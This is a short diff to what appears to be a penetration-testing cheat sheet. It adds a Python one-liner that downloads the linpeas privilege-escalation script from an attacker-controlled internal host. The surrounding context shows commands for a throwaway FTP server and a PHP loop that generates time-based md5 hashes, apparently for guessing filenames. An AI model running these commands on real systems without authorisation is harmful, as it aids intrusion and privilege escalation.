@@ -163,9 +163,15 @@ while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' .
 time());echo "\n";sleep(1);}
 ```
 
-## Python FTP server
+## Python3 FTP server
 
 ```
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
+```
+
+## Python3 download a file 
+
+```
+python3 -c "import urllib.request;u = 'http://10.33.1.154:8080/linpeas.sh';urllib.request.urlretrieve(u, 'linpeas.sh')"
 ```
